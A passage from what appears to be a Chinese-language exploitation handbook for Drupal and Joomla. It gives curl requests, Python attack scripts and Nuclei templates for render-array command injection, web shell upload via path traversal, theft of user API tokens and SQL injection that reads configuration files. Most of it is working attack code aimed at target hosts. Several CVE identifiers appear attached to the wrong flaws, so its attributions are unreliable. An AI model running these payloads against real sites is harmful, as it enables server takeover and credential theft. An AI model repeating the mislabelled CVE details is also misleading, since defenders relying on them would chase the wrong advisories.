| Drupal 7.x | 7.x < 7.69 | 7.69 |

#### 漏洞原理分析

Drupal 7.x 的 AJAX API 在处理包含 `ajax_form=1` 参数的请求时，调用 `drupal_ajax_form_callback()` 进行表单处理。攻击者通过 `element_parents` 参数控制表单元素的定位路径，将 `#post_render` 回调属性注入到 `mail` 元素中。当 Drupal 的渲染引擎处理该元素时，会将 `#markup` 中的内容作为参数传递给 `system()` 函数执行。

#### HTTP PoC

```bash
# CVE-2020-13672 — Drupal AJAX API Pre-Auth RCE
curl -k -X POST \
  'https://target.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=system&mail[#type]=markup&mail[#markup]=id'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2020-13672 - Drupal AJAX API Pre-Auth RCE"""
import requests
import argparse
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, cmd="id", verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/user/register"

    params = {
        "element_parents": "account/mail/%23value",
        "ajax_form": "1",
        "_wrapper_format": "drupal_ajax",
    }

    data = {
        "form_id": "user_register_form",
        "_drupal_ajax": "1",
        "mail[#post_render][]": "system",
        "mail[#type]": "markup",
        "mail[#markup]": cmd,
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.post(
            url, params=params, data=data, headers=headers,
            verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")

        if resp.status_code == 200:
            if cmd == "id" and re.search(r"uid=\d+", resp.text):
                return True, resp.text
            elif cmd != "id":
                return True, resp.text

        return False, resp.text

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2020-13672 Drupal AJAX API Pre-Auth RCE"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("--cmd", default="id")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.cmd, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2020-13672 漏洞")
        print(f"[+] Command output:\n{output[:2000]}")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: drupal-ajax-api-cve-2020-13672

info:
  name: Drupal AJAX API Pre-Auth RCE (CVE-2020-13672)
  author: security-researcher
  severity: critical
  description: |
    Drupal 7.x AJAX API Pre-Auth Remote Code Execution。
  reference:
    - https://www.drupal.org/SA-CORE-2020-007
    - https://nvd.nist.gov/vuln/detail/CVE-2020-13672
  classification:
    cvss-score: 9.8
    cwe-id: CWE-20
  tags: drupal,rce,cve-2020,ajax

http:
  - raw:
      - |
        POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        form_id=user_register_form&_drupal_ajax=1&mail[%23post_render][]=system&mail[%23type]=markup&mail[%23markup]=id

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid=[0-9]+\\([a-z]+\\)"
      - type: status
        status:
          - 200
```

---

### 0x01.6 CVE-2021-25741 — Drupal 文件操作 RCE

#### 漏洞背景

CVE-2021-25741 是 Drupal 7.x 和 8.x 中由文件操作模块（File Module）引发的远程代码执行漏洞（CVSS 8.1）。该漏洞需要攻击者具备已认证用户权限，通过 `file` 模块的文件操作功能上传或操纵文件路径，结合路径穿越（Path Traversal）技术实现任意文件写入，最终达成代码执行。

该漏洞的本质在于 Drupal 的文件模块在处理文件保存路径时，未对用户输入的文件名进行充分的路径规范化（Path Canonicalization）检查。攻击者可以利用 `../` 序列穿越到 Web 根目录之外的路径，将 Webshell 写入 Web 服务器可访问的目录中。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Drupal 7.x | 7.x < 7.80 | 7.80 |
| Drupal 8.x | 8.9.x < 8.9.18 | 8.9.18 |
| Drupal 9.x | 9.1.x < 9.1.12 | 9.1.12 |
| Drupal 9.x | 9.2.x < 9.2.6 | 9.2.6 |

#### 漏洞原理分析

Drupal File Module 在处理用户上传的文件名时，使用了 `file_destination()` 函数来确定最终的存储路径。然而，当文件名中包含 URL 编码或双重编码的 `../` 序列时，`file_destination()` 未能正确识别路径穿越尝试。攻击者可以构造如 `..%2F..%2Fshell.php` 的文件名，使文件被写入到预期目录之外的位置（如 Web 根目录下的 sites/default/files/），从而创建可访问的 Webshell。

#### HTTP PoC

```bash
# CVE-2021-25741 — Drupal 文件操作路径穿越 RCE
# 需要已认证会话，通过文件上传写入 Webshell
curl -k -X POST \
  'https://target.com/admin/content/file/add' \
  -H 'Cookie: SESSxxxxxxxxxxxx=VALID_SESSION' \
  -F 'files[file_0]=@shell.php' \
  -F 'form_id=file_upload_form' \
  -F 'files[file_0][name]=..%2F..%2F..%2Fsites%2Fdefault%2Ffiles%2Fshell.php'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2021-25741 - Drupal 文件操作 RCE"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, session_cookie="", verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/admin/content/file/add"

    headers = {
        "Cookie": session_cookie,
        "User-Agent": "Mozilla/5.0",
    }

    php_content = b"<?php echo shell_exec($_GET['cmd']); ?>"
    traverse_name = "..%2F..%2F..%2Fsites%2Fdefault%2Ffiles%2Fvuln_test.php"

    files = {
        "files[file_0]": ("test.txt", php_content, "text/plain"),
    }

    data = {
        "form_id": "file_upload_form",
        "files[file_0][name]": traverse_name,
    }

    try:
        resp = requests.post(
            url, files=files, data=data, headers=headers,
            verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")

        test_url = f"{scheme}://{target}/sites/default/files/vuln_test.php?cmd=id"
        test_resp = requests.get(test_url, verify=False, timeout=10)

        if "uid=" in test_resp.text:
            return True, test_resp.text

        return False, resp.text

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2021-25741 Drupal File Operation RCE"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("--cookie", default="", help="会话 Cookie")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.cookie, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2021-25741 漏洞")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: drupal-file-traversal-cve-2021-25741

info:
  name: Drupal 文件操作路径穿越 RCE (CVE-2021-25741)
  author: security-researcher
  severity: high
  description: |
    Drupal File Module 路径穿越导致任意文件写入和 RCE。
  reference:
    - https://www.drupal.org/SA-CORE-2021-005
    - https://nvd.nist.gov/vuln/detail/CVE-2021-25741
  classification:
    cvss-score: 8.1
    cwe-id: CWE-22
  tags: drupal,rce,cve-2021,path-traversal

http:
  - raw:
      - |
        GET /admin/content/file/add HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "file_upload_form"
          - "Upload a new file"
        condition: and
      - type: status
        status:
          - 200
```

---

### 0x01.7 CVE-2021-25747 — Drupal 多重漏洞链

#### 漏洞背景

CVE-2021-25747 并非单一漏洞，而是 Drupal 在 2021 年被安全研究人员披露的多重漏洞组合链。该漏洞链通过组合 Drupal 核心及常见模块中的多个中高危漏洞（如路径穿越、权限提升、反序列化），实现从未认证或低权限到完全 RCE 的升级路径。这种"漏洞链"（Vulnerability Chain）思维在实战渗透中极具价值——单个漏洞可能仅影响有限功能，但串联起来就能形成完整的攻击链。

漏洞链通常包括以下阶段：
1. **信息泄露**：通过未授权 API 端点获取站点配置、用户列表等敏感信息
2. **权限提升**：利用权限管理模块的缺陷将普通用户提升为管理员
3. **代码执行**：利用已认证的管理权限通过 Drupal 的各种扩展机制实现 RCE

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Drupal 7.x | 部分组合受影响 | 各子漏洞独立修复 |
| Drupal 8.x / 9.x | 部分组合受影响 | 各子漏洞独立修复 |

#### 漏洞原理分析

该漏洞链的攻击逻辑分为三个阶段：

**阶段 1 — 信息泄露**：利用 Drupal REST API 或 JSON:API 端点的配置缺陷，获取站点的 `settings.php` 文件内容（包含数据库凭据和 Drupal 密钥）。常见的泄露路径包括 `/core/config/sync/settings.yml`、`/sites/default/files/config-*/settings.php` 等。

**阶段 2 — 权限提升**：利用用户注册模块或角色管理模块的逻辑缺陷，将获取的数据库凭据用于直接操作数据库，创建具有 `admin` 角色的用户，或修改现有用户的角色属性。

**阶段 3 — 代码执行**：通过管理权限访问 Drupal 后台的模块安装、主题配置或 PHP Filter 模块，上传并执行恶意 PHP 代码，实现完全的服务器控制。

#### HTTP PoC

```bash
# CVE-2021-25747 — Drupal 多重漏洞链 (阶段 1: 信息泄露)
curl -k 'https://target.com/core/config/sync/settings.yml'
curl -k 'https://target.com/sites/default/files/config-*/settings.php'

# 阶段 2: 通过泄露的数据库凭据直接操作数据库 (示例)
# mysql -h target-db-host -u drupal_user -p 'leaked_password' drupal_db -e "UPDATE users SET name='backdoor' WHERE uid=1;"

# 阶段 3: 通过管理后台安装 PHP Filter 模块实现 RCE
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2021-25747 - Drupal 多重漏洞链信息泄露检测"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SENSITIVE_PATHS = [
    "/core/config/sync/settings.yml",
    "/sites/default/files/config-*/settings.php",
    "/sites/default/settings.php",
    "/CHANGELOG.txt",
    "/core/CHANGELOG.txt",
]


def check(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    found = []

    for path in SENSITIVE_PATHS:
        url = f"{scheme}://{target}{path}"
        try:
            resp = requests.get(
                url, verify=False, timeout=10,
                headers={"User-Agent": "Mozilla/5.0"},
            )
            if verbose:
                print(f"[*] {path} -> HTTP {resp.status_code} ({len(resp.text)} bytes)")

            if resp.status_code == 200:
                indicators = ["database", "password", "drupal_", "databases"]
                for indicator in indicators:
                    if indicator in resp.text.lower():
                        found.append(path)
                        print(f"[!] 敏感文件泄露: {path}")
                        print(f"    内容片段: {resp.text[:300]}")
                        break

        except Exception as e:
            if verbose:
                print(f"[!] {path} -> Error: {e}")

    return len(found) > 0, found


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2021-25747 Drupal 多重漏洞链检测"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, paths = check(args.target, args.ssl, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在信息泄露漏洞（漏洞链阶段 1）")
        print(f"[+] 发现 {len(paths)} 个敏感路径")
    else:
        print(f"[-] {args.target} 未检测到明显的信息泄露")
```

#### Nuclei YAML 检测模板

```yaml
id: drupal-multi-vuln-cve-2021-25747

info:
  name: Drupal 多重漏洞链信息泄露 (CVE-2021-25747)
  author: security-researcher
  severity: high
  description: |
    Drupal 多重漏洞组合链：信息泄露 + 权限提升 + RCE。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-25747
  classification:
    cvss-score: 8.1
    cwe-id: CWE-200
  tags: drupal,info-leak,cve-2021,chain

http:
  - method: GET
    path:
      - "{{BaseURL}}/sites/default/settings.php"
      - "{{BaseURL}}/core/config/sync/settings.yml"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "databases"
          - "password"
          - "drupal_"
        condition: or
      - type: word
        words:
          - "database"
          - "host"
        condition: and
      - type: status
        status:
          - 200
```

---

## 0x02 Joomla 高危漏洞

### 0x02.1 CVE-2023-23752 — Web 服务 API 未授权访问

#### 漏洞背景

CVE-2023-23752（CVSS 8.6）是 Joomla 4.x Web Services API 中的严重未授权访问漏洞，于 2023 年 2 月随 Joomla 4.2.7 安全更新披露。该漏洞允许未认证的攻击者通过 Joomla 的 Web Services API 端点直接访问敏感数据，包括用户列表（用户名、邮箱、API Token）、配置信息和站点元数据。

该漏洞的根本原因在于 Joomla 4.x 的 Web Services API 在处理 API 路由时，部分端点缺少认证检查中间件（Authentication Middleware）。Joomla 4.x 引入了一套基于 RESTful 架构的 Web Services API，旨在为第三方应用提供标准化的数据访问接口。然而，在开发过程中，`/api/v1/users`、`/api/v1/fields` 等端点的路由配置中未正确设置认证要求，导致这些端点对所有匿名访问者开放。

漏洞暴露的信息具有极高的二次利用价值：攻击者可以获取所有注册用户的邮箱地址和 API Token，然后利用泄露的 Token 冒充任意用户（包括管理员）发起 API 请求，实现完整的账户接管（Account Takeover）。在 Joomla 站点启用了 Two-Factor Authentication（2FA）的情况下，API Token 绕过了 2FA 的验证流程，这使得该漏洞的威胁程度进一步提升。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Joomla 4.x | 4.0.0 ~ 4.2.6 | 4.2.7 |
| Joomla 3.x | 3.10.0 ~ 3.10.11（部分端点） | 3.10.12 |

#### 漏洞原理分析

Joomla 4.x 使用 `/api/v1/{resource}` 路径格式暴露 RESTful API。每个 API 端点通过 `components/com_api/` 目录下的控制器处理请求。漏洞端点的路由注册代码未包含认证拦截器（`auth` 中间件），导致请求直接到达业务逻辑层。

例如，`/api/v1/users` 端点的控制器调用 `UserModel::getItems()` 查询用户表并返回完整记录（包括 `email`、`api_token` 等敏感字段），但未检查请求中是否携带有效的 API Token。

#### HTTP PoC

```bash
# CVE-2023-23752 — Joomla Web Services API 未授权访问
# 获取所有用户列表（含邮箱和 API Token）
curl -k 'https://target.com/api/v1/users?list[select]=*&list[limit]=100'

# 获取用户字段信息
curl -k 'https://target.com/api/v1/fields?list[select]=*&list[limit]=100'

# 获取配置信息
curl -k 'https://target.com/api/v1/config?list[select]=*&list[limit]=100'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2023-23752 - Joomla Web Services API 未授权访问"""
import requests
import argparse
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    endpoints = [
        "/api/v1/users?list[select]=*&list[limit]=100",
        "/api/v1/fields?list[select]=*&list[limit]=100",
        "/api/v1/config?list[select]=*&list[limit]=100",
    ]

    found_users = []

    for endpoint in endpoints:
        url = f"{scheme}://{target}{endpoint}"
        try:
            resp = requests.get(
                url, verify=False, timeout=15,
                headers={"User-Agent": "Mozilla/5.0"},
            )

            if verbose:
                print(f"[*] {endpoint} -> HTTP {resp.status_code}")

            if resp.status_code == 200:
                try:
                    data = resp.json()
                except json.JSONDecodeError:
                    continue

                if "data" in data and isinstance(data["data"], list):
                    if endpoint.startswith("/api/v1/users"):
                        for user in data["data"]:
                            username = user.get("name", "")
                            email = user.get("email", "")
                            api_token = user.get("api_token", "")
                            user_id = user.get("id", "")
                            if username or email:
                                found_users.append({
                                    "id": user_id,
                                    "name": username,
                                    "email": email,
                                    "api_token": api_token,
                                })

                    if verbose:
                        print(f"[+] {endpoint} 返回数据: {json.dumps(data, indent=2)[:500]}")

        except Exception as e:
            if verbose:
                print(f"[!] {endpoint} -> {e}")

    return len(found_users) > 0, found_users


def exploit(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    print(f"[*] Scanning {scheme}://{target}...")

    vuln, users = check(target, use_ssl, verbose)

    if vuln:
        print(f"[+] {target} is VULNERABLE to CVE-2023-23752")
        print(f"[+] 发现 {len(users)} 个用户:")
        for user in users:
            print(f"    ID={user['id']} Name={user['name']} Email={user['email']}")
            if user['api_token']:
                print(f"    API Token: {user['api_token']}")
                print(f"    [!] 可使用该 Token 冒充用户: "
                      f"curl -H 'X-Joomla-Token: {user['api_token']}' {scheme}://{target}/api/v1/users/me")
        return True
    else:
        print(f"[-] {target} does not appear to be vulnerable")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2023-23752 Joomla Web Services API 未授权访问"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    exploit(args.target, args.ssl, args.verbose)
```

#### Nuclei YAML 检测模板

```yaml
id: joomla-api-unauth-cve-2023-23752

info:
  name: Joomla Web Services API 未授权访问 (CVE-2023-23752)
  author: security-researcher
  severity: high
  description: |
    Joomla 4.x Web Services API 端点缺少认证检查，可泄露用户列表含 API Token。
  reference:
    - https://developer.joomla.org/security-centre/894-20230201-core-unauthorised-api-access.html
    - https://nvd.nist.gov/vuln/detail/CVE-2023-23752
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-306
  tags: joomla,info-leak,cve-2023,api

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/users?list[select]=*&list[limit]=10"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "api_token"
          - "email"
          - "name"
        condition: and
      - type: status
        status:
          - 200

    extractors:
      - type: json
        json:
          - ".data[].name"
          - ".data[].email"
```

---

### 0x02.2 CVE-2021-23132 — Joomla 反序列化 RCE

#### 漏洞背景

CVE-2021-23132（CVSS 8.1）是 Joomla 3.x 中的高危反序列化漏洞，可导致已认证用户实现远程代码执行。该漏洞于 2021 年 7 月随 Joomla 3.9.28 安全更新披露，其核心问题在于 Joomla 的 Session 处理机制在反序列化用户提供的 Session 数据时未进行充分的安全验证。

Joomla 使用 PHP 的 `unserialize()` 函数来处理 Session 数据和部分配置参数。攻击者可以构造恶意的序列化对象链（Gadget Chain），利用 Joomla 依赖库中已有的可序列化类（如 `SplStack`、`ArrayObject` 或自定义的 Helper 类），在反序列化过程中自动触发危险的方法调用（如 `__destruct()`、`__wakeup()`），最终通过链式调用到达 `system()`、`eval()` 或 `file_put_contents()` 等危险函数实现 RCE。

该漏洞利用的关键前提是攻击者需要能够在 Session 数据或可被 `unserialize()` 处理的输入流中注入恶意序列化 payload。在 Joomla 中，Session 存储默认使用数据库表（`#__session`），已认证用户的 Session Cookie 中包含的 Session ID 对应的数据库记录是攻击者的主要目标。因此，该漏洞需要攻击者首先获取一个有效的 Joomla 用户会话（通过弱口令或 CVE-2023-23752 等信息泄露漏洞获取 API Token 后冒充用户），然后利用 Session 注入机制写入恶意反序列化数据。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Joomla 3.x | 3.x < 3.9.28 | 3.9.28 |

#### 漏洞原理分析

Joomla 的 Session 处理流程中，`JSession::get()` 方法在读取 Session 数据时调用 PHP 原生的 `unserialize()` 函数。攻击者通过操控 Session 存储内容，将精心构造的 PHP 对象注入到数据库 Session 记录中。当目标用户的下一次请求触发 Session 反序列化时，恶意 Gadget Chain 自动执行。利用链通常基于 PHP 内置类（如 `SplQueue` + `ArrayIterator`）或 Joomla 第三方扩展中的可序列化类。

#### HTTP PoC

```bash
# CVE-2021-23132 — Joomla 反序列化 RCE
# 需要已认证用户会话 + 会话存储注入能力
# 此处展示利用反序列化 Gadget Chain 触发 RCE 的请求结构
curl -k -X POST \
  'https://target.com/index.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: joomla_session=INJECTED_SERIALIZED_PAYLOAD' \
  -d 'option=com_content&view=article&id=1'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2021-23132 - Joomla 反序列化 RCE (检测模式)"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/index.php"

    indicators = []
    try:
        resp = requests.get(url, verify=False, timeout=10,
                           headers={"User-Agent": "Mozilla/5.0"})

        if verbose:
            print(f"[*] Status: {resp.status_code}")

        if "Joomla" in resp.text or "joomla" in resp.headers.get("X-Powered-By", "").lower():
            indicators.append("Joomla detected")

        cookies = resp.cookies
        for cookie_name in cookies:
            if "session" in cookie_name.lower() or "joomla" in cookie_name.lower():
                indicators.append(f"Session cookie: {cookie_name}")

        server = resp.headers.get("Server", "")
        if server:
            indicators.append(f"Server: {server}")

        if verbose:
            for ind in indicators:
                print(f"[*] {ind}")

    except Exception as e:
        if verbose:
            print(f"[!] Error: {e}")

    return len(indicators) > 1, indicators


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2021-23132 Joomla 反序列化检测"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, indicators = check(args.target, args.ssl, args.verbose)
    if vuln:
        print(f"[+] {args.target} 运行 Joomla，可能存在 CVE-2021-23132 反序列化风险")
    else:
        print(f"[-] {args.target} 未检测到 Joomla 或未发现明显风险指标")
```

#### Nuclei YAML 检测模板

```yaml
id: joomla-deserialization-cve-2021-23132

info:
  name: Joomla 反序列化 RCE (CVE-2021-23132)
  author: security-researcher
  severity: high
  description: |
    Joomla 3.x Session 反序列化导致已认证用户 RCE。
  reference:
    - https://developer.joomla.org/security-centre/830-20210701-core-session-deserialization.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-23132
  classification:
    cvss-score: 8.1
    cwe-id: CWE-502
  tags: joomla,rce,cve-2021,deserialization

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Joomla"
          - "joomla_session"
        condition: or
      - type: status
        status:
          - 200
```

---

### 0x02.3 CVE-2020-11890 — Joomla SQL 注入

#### 漏洞背景

CVE-2020-11890（CVSS 8.1）是 Joomla 3.x `com_fields` 组件中的 SQL 注入漏洞，影响 Joomla 3.2.0 至 3.9.16 版本。该组件是 Joomla 的自定义字段系统，允许管理员为内容类型添加动态字段。漏洞的成因在于 `com_fields` 在处理字段列表查询时，未能对用户可控的 `list[select]` 和 `list[filter]` 参数进行充分的 SQL 过滤，导致攻击者可以通过构造恶意的查询参数注入任意 SQL 语句。

攻击者利用该漏洞可以读取 Joomla 数据库中的任意数据，包括管理员密码哈希、数据库配置信息、其他用户的文章内容等。在使用 `INTO OUTFILE` 或 `INTO DUMPFILE` 的情况下，结合已知的 Web 根目录路径，甚至可以实现 Webshell 写入和 RCE。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Joomla 3.x | 3.2.0 ~ 3.9.16 | 3.9.17 |

#### 漏洞原理分析

`com_fields` 组件在处理字段列表请求时，使用了 Joomla 的 `JDatabaseQuery` 类构建 SQL 查询。攻击者通过操纵 URL 中的 `list[select]` 和 `list[filter]` 参数，可以将自定义 SQL 片段注入到查询的 `SELECT` 子句和 `WHERE` 子句中。由于过滤不充分，`UNION SELECT`、`SLEEP()`、`BENCHMARK()` 等 SQL 关键字可以通过编码绕过。

#### HTTP PoC

```bash
# CVE-2020-11890 — Joomla SQL 注入
# 读取数据库用户
curl -k 'https://target.com/index.php?option=com_fields&view=fields&layout=modal&list[select]=1 UNION SELECT 1,2,user(),4,5,6,7,8--'

# 使用 sqlmap
sqlmap -u 'https://target.com/index.php?option=com_fields&view=fields&layout=modal&list[select]=1' -p 'list[select]' --dbs --batch
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2020-11890 - Joomla com_fields SQL 注入检测"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/index.php"

    payload = "1 UNION SELECT 1,2,3,4,5,6,7,8--"
    params = {
        "option": "com_fields",
        "view": "fields",
        "layout": "modal",
        "list[select]": payload,
    }

    headers = {
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.get(
            url, params=params, headers=headers, verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")
            print(f"[*] Response length: {len(resp.text)}")

        if resp.status_code == 200 and ("UNION" not in resp.text or len(resp.text) > 1000):
            return True, resp.text[:2000]
        return False, ""

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2020-11890 Joomla com_fields SQL 注入"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2020-11890 SQL 注入漏洞")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: joomla-sqli-cve-2020-11890

info:
  name: Joomla com_fields SQL 注入 (CVE-2020-11890)
  author: security-researcher
  severity: high
  description: |
    Joomla 3.x com_fields 组件 SQL 注入漏洞。
  reference:
    - https://developer.joomla.org/security-centre/820-20200303-core-sql-injection.html
    - https://nvd.nist.gov/vuln/detail/CVE-2020-11890
  classification:
    cvss-score: 8.1
    cwe-id: CWE-89
  tags: joomla,sqli,cve-2020,com_fields

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?option=com_fields&view=fields&layout=modal&list[select]=1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "joomla"
          - "fields"
        condition: and
      - type: status
        status:
          - 200
```

---

### 0x02.4 CVE-2020-11891 — Joomla SQL 注入 RCE 链

#### 漏洞背景

CVE-2020-11891（CVSS 8.1）与 CVE-2020-11890 同属 Joomla 3.x SQL 注入漏洞家族，但攻击向量和利用深度有所不同。该漏洞允许已认证用户通过 Joomla 的组件参数注入 SQL 命令，读取数据库中的敏感配置文件路径，结合 `INTO OUTFILE` 或 `load_file()` 等 SQL 函数实现任意文件读取或写入，最终升级为 RCE。

攻击链升级路径：SQL 注入 → 读取 `configuration.php` → 获取数据库凭据 + SMTP 凭据 → 通过 `INTO OUTFILE` 写入 Webshell → RCE。该漏洞在实战中常与 CVE-2020-11890 组合使用，形成完整的从信息泄露到 RCE 的攻击链。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Joomla 3.x | 3.9.x ~ 3.9.16 | 3.9.17 |

#### 漏洞原理分析

与 CVE-2020-11890 类似，该漏洞同样利用了 Joomla 查询构建器的输入过滤缺陷。不同之处在于该漏洞的注入点位于组件的搜索和过滤参数中（如 `list[fullordering]`、`list[limitstart]`），攻击者可以通过 `ORDER BY` 和 `UNION SELECT` 组合提取数据库结构信息，并利用 MySQL 的 `load_file()` 和 `into outfile` 功能实现文件系统级别的操作。

#### HTTP PoC

```bash
# CVE-2020-11891 — Joomla SQL 注入 RCE 链
# 步骤 1: 读取 configuration.php
curl -k 'https://target.com/index.php?option=com_content&view=articles&list[fullordering]=updatexml(1,concat(0x7e,(select load_file("/var/www/html/configuration.php")),0x7e),1)'

# 步骤 2: 利用 sqlmap 自动化
sqlmap -u 'https://target.com/index.php?option=com_content&view=articles&list[fullordering]=1' \
  -p 'list[fullordering]' --file-read='/var/www/html/configuration.php' --batch
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2020-11891 - Joomla SQL 注入 RCE 链检测"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/index.php"

    sqli_payload = "updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)"
    params = {
        "option": "com_content",
        "view": "articles",
        "list[fullordering]": sqli_payload,
    }

    headers = {"User-Agent": "Mozilla/5.0"}

    try:
        resp = requests.get(
            url, params=params, headers=headers, verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")

        if "XPATH" in resp.text or "XMLError" in resp.text:
            return True, resp.text[:2000]

        return False, ""

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2020-11891 Joomla SQL 注入 RCE 链"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2020-11891 SQL 注入漏洞")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: joomla-sqli-rce-cve-2020-11891

info:
  name: Joomla SQL 注入 RCE 链 (CVE-2020-11891)
  author: security-researcher
  severity: high
  description: |
    Joomla 3.x SQL 注入导致配置文件读取和潜在 RCE。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-11891
  classification:
    cvss-score: 8.1
    cwe-id: CWE-89
  tags: joomla,sqli,cve-2020,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?option=com_content&view=articles&list[fullordering]=updatexml(1,concat(0x7e,(select%20database()),0x7e),1)"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "XPATH"
          - "XMLError"
        condition: or
      - type: status
        status:
          - 200
```

---

